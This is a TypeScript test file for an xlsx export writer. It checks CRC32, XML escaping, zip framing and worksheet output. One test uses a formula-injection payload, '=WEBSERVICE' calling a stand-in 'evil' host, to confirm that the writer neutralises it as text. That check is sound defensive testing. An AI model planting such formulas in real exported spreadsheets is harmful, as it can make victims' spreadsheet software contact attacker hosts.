// SPDX-License-Identifier: Apache-2.0
import { describe, it, expect } from 'vitest'
import { writeXlsx, __internal } from '../../src/export/xlsx-writer.js'

// `__internal` is a test-only export (JSDoc-marked @internal) of the writer's primitives,
// consumed here so check-no-unused-exports does not flag it. It also gives direct coverage
// of the CRC32 / zip-framing / escaping primitives that the end-to-end structural tests only
// exercise indirectly.
const { crc32, xmlEscape, xmlAttrEscape, colLetter, makeLocalHeader, makeCentralDirHeader, makeEocd } =
  __internal

describe('xlsx-writer __internal.crc32', () => {
  it('matches the standard CRC32 check vectors', () => {
    expect(crc32(Buffer.from(''))).toBe(0x00000000)
    expect(crc32(Buffer.from('123456789'))).toBe(0xcbf43926)
    expect(crc32(Buffer.from('hello'))).toBe(0x3610a686)
  })

  it('is unsigned (no sign bit)', () => {
    // A vector whose signed-interpreted CRC would be negative must still be a positive uint32.
    expect(crc32(Buffer.from('hello world!'))).toBeGreaterThanOrEqual(0)
    expect(crc32(Buffer.from('hello world!'))).toBeLessThanOrEqual(0xffffffff)
  })
})

describe('xlsx-writer __internal.xmlEscape', () => {
  it('escapes & < > but leaves " and \' literal in text content', () => {
    expect(xmlEscape('a & b < c > d')).toBe('a &amp; b &lt; c &gt; d')
    expect(xmlEscape('he said "hi" and \'bye\'')).toBe('he said "hi" and \'bye\'')
  })

  it('strips XML-illegal control chars (keeps TAB/CR/LF)', () => {
    expect(xmlEscape('a\x00b\x07c')).toBe('abc')
    expect(xmlEscape('a\x0bb')).toBe('ab') // 0x0B (VT) stripped
    expect(xmlEscape('line1\tline2\rline3\n')).toBe('line1\tline2\rline3\n')
  })
})

describe('xlsx-writer __internal.xmlAttrEscape', () => {
  it('escapes & < > " \' for attribute values (text-content escaper leaves quotes literal)', () => {
    expect(xmlAttrEscape('a & b < c > d "e" \'f\'')).toBe(
      'a &amp; b &lt; c &gt; d &quot;e&quot; &apos;f&apos;',
    )
    // Text-content escaper leaves quotes literal (valid in <t> bodies).
    expect(xmlEscape('a & b < c > d "e" \'f\'')).toBe('a &amp; b &lt; c &gt; d "e" \'f\'')
  })
})

describe('xlsx-writer __internal.colLetter', () => {
  it('maps 1-based column indices to spreadsheet letters', () => {
    expect(colLetter(1)).toBe('A')
    expect(colLetter(10)).toBe('J')
    expect(colLetter(26)).toBe('Z')
    expect(colLetter(27)).toBe('AA')
    expect(colLetter(28)).toBe('AB')
  })
})

describe('xlsx-writer __internal zip framing', () => {
  it('makeLocalHeader: STORE method, little-endian sizes, CRC placed', () => {
    const data = Buffer.from('payload')
    const crc = crc32(data)
    const hdr = makeLocalHeader('name.xml', data)
    expect(hdr.readUInt32LE(0)).toBe(0x04034b50) // PK\x03\x04
    expect(hdr.readUInt16LE(8)).toBe(0) // method = STORE
    expect(hdr.readUInt32LE(14)).toBe(crc) // CRC-32
    expect(hdr.readUInt32LE(18)).toBe(data.length) // compressed size == uncompressed
    expect(hdr.readUInt32LE(22)).toBe(data.length) // uncompressed size
    expect(hdr.readUInt16LE(26)).toBe(Buffer.byteLength('name.xml')) // filename length
  })

  it('makeCentralDirHeader: signature + local-header-offset wiring', () => {
    const hdr = makeCentralDirHeader('name.xml', 0x1234, 0xdeadbeef, 7)
    expect(hdr.readUInt32LE(0)).toBe(0x02014b50) // PK\x01\x02
    expect(hdr.readUInt16LE(10)).toBe(0) // method = STORE
    expect(hdr.readUInt32LE(16)).toBe(0xdeadbeef) // CRC-32
    expect(hdr.readUInt32LE(42)).toBe(0x1234) // local header offset
  })

  it('makeEocd: signature + central-dir offset/size', () => {
    const eocd = makeEocd(2, 0x100, 0x400)
    expect(eocd.readUInt32LE(0)).toBe(0x06054b50) // PK\x05\x06
    expect(eocd.readUInt16LE(8)).toBe(2) // entries on disk
    expect(eocd.readUInt16LE(10)).toBe(2) // total entries
    expect(eocd.readUInt32LE(12)).toBe(0x100) // size of central dir
    expect(eocd.readUInt32LE(16)).toBe(0x400) // offset of central dir
  })
})

describe('xlsx-writer writeXlsx (end-to-end)', () => {
  it('produces a valid zip with headers, a neutralized formula cell, and a bold header', () => {
    const buf = writeXlsx({
      name: 'Feature Matrix',
      headers: ['feature_id', 'capability'],
      rows: [['REQ-001', 'Static analysis']],
    })
    expect(buf.subarray(0, 4)).toEqual(Buffer.from([0x50, 0x4b, 0x03, 0x04]))
    // Walk local headers to find the worksheet part.
    const xml = extract(buf, 'xl/worksheets/sheet1.xml').toString('utf8')
    expect(xml).toContain('<t xml:space="preserve">feature_id</t>')
    expect(xml).toContain('<t xml:space="preserve">Static analysis</t>')
    // Header cell carries the bold style (s="1").
    expect(xml).toMatch(/<c r="A1"[^>]*s="1"/)
    // Data cells must NOT be bold — a writer that bolds every cell would still pass the
    // header-only assertion above, so assert the data cell carries no `s` attribute.
    expect(xml).toMatch(/<c r="A2" t="inlineStr">/)
    expect(xml).not.toMatch(/<c r="A2"[^>]*s="1"/)
  })

  it('neutralizes a =WEBSERVICE note cell (defense-in-depth) on an inline-string cell', () => {
    const buf = writeXlsx({
      name: 'S',
      headers: ['note'],
      rows: [['=WEBSERVICE("http://evil/x")']],
    })
    const xml = extract(buf, 'xl/worksheets/sheet1.xml').toString('utf8')
    // The real protection is t="inlineStr" (structurally text); the ' prefix is defense-in-depth.
    expect(xml).toContain('t="inlineStr"')
    expect(xml).toContain(`<t xml:space="preserve">'=WEBSERVICE("http://evil/x")</t>`)
  })

  it('EOCD points at a real central-directory header (end-to-end framing)', () => {
    const buf = writeXlsx({ name: 'S', headers: ['a'], rows: [['x']] })
    // EOCD is the last 22 bytes of the zip.
    const eocd = buf.subarray(buf.length - 22)
    expect(eocd.readUInt32LE(0)).toBe(0x06054b50) // PK\x05\x06
    const cdOffset = eocd.readUInt32LE(16)
    const cdSize = eocd.readUInt32LE(12)
    const entryCount = eocd.readUInt16LE(10)
    expect(entryCount).toBe(6) // 6 OOXML parts
    // A central-directory signature must sit at cdOffset, and the EOCD must immediately
    // follow the central directory (cdOffset + cdSize === start of EOCD).
    expect(buf.readUInt32LE(cdOffset)).toBe(0x02014b50) // PK\x01\x02
    expect(cdOffset + cdSize).toBe(buf.length - 22)
  })

  it('escapes a double-quote in the sheet name (attribute-safe workbook.xml)', () => {
    const buf = writeXlsx({ name: 'Sheet "Q"', headers: ['a'], rows: [['x']] })
    const wb = extract(buf, 'xl/workbook.xml').toString('utf8')
    expect(wb).toContain('<sheet name="Sheet &quot;Q&quot;"')
    // Must remain well-formed XML (no raw unescaped quote inside the attribute).
    expect(wb).not.toMatch(/name="Sheet "Q""/)
  })

  it('throws on an empty headers array (no malformed <dimension>)', () => {
    expect(() => writeXlsx({ name: 'S', headers: [], rows: [] })).toThrow(/header column/)
  })
})

// STORE-only local-header walker (same layout as the feature-matrix-export test).
function extract(buf: Buffer, name: string): Buffer {
  let off = 0
  while (off + 30 <= buf.length && buf.readUInt32LE(off) === 0x04034b50) {
    const usize = buf.readUInt32LE(off + 22)
    const nameLen = buf.readUInt16LE(off + 26)
    const extraLen = buf.readUInt16LE(off + 28)
    const n = buf.subarray(off + 30, off + 30 + nameLen).toString('utf8')
    const dataStart = off + 30 + nameLen + extraLen
    if (n === name) return buf.subarray(dataStart, dataStart + usize)
    off = dataStart + usize
  }
  throw new Error(`zip entry not found: ${name}`)
}